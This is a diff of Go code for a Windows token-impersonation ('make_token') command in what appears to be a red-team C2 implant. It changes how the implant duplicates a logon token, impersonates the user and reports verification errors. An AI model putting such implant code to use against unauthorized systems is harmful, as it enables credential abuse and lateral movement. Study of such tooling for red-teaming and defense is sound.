@@ -134,10 +134,12 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Duplicate the token as an impersonation token (like Apollo does)
+	// Convert to Token type and duplicate as impersonation token
+	primaryToken := windows.Token(newTokenHandle)
+	
 	var hDupToken windows.Token
 	err = windows.DuplicateTokenEx(
-		windows.Token(newTokenHandle),
+		primaryToken,
 		windows.TOKEN_ALL_ACCESS,
 		nil,
 		windows.SecurityImpersonation,
@@ -145,7 +147,7 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		&hDupToken,
 	)
 	if err != nil {
-		windows.CloseHandle(newTokenHandle)
+		primaryToken.Close()
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("DuplicateTokenEx failed: %v", err),
 			Status:    "error",
@@ -153,10 +155,10 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 	
-	// Close the original token, keep the duplicate
-	windows.CloseHandle(newTokenHandle)
+	// Close the primary token, keep the impersonation token
+	primaryToken.Close()
 	
-	// Impersonate the duplicated token
+	// Impersonate using the duplicated impersonation token
 	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
 	if ret == 0 {
 		hDupToken.Close()
@@ -167,8 +169,8 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Don't close the duplicate handle - it needs to stay open for impersonation to remain valid
-	// The token will be closed when rev2self is called or process exits
+	// Keep the token handle open - needed for impersonation to remain valid
+	// Will be cleaned up on rev2self or process exit
 
 	// Verify impersonation by checking thread token
 	var hThreadToken windows.Token
@@ -180,10 +182,15 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
 			if err == nil {
 				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
+			} else {
+				output += "Successfully impersonated (verification lookup failed)"
 			}
+		} else {
+			output += "Successfully impersonated (verification query failed)"
 		}
 	} else {
-		output += "Warning: Could not verify impersonation"
+		// OpenThreadToken failed - add detailed error
+		output += fmt.Sprintf("Impersonation may have failed - OpenThreadToken error: %v", err)
 	}
 
 	return structs.CommandResult{
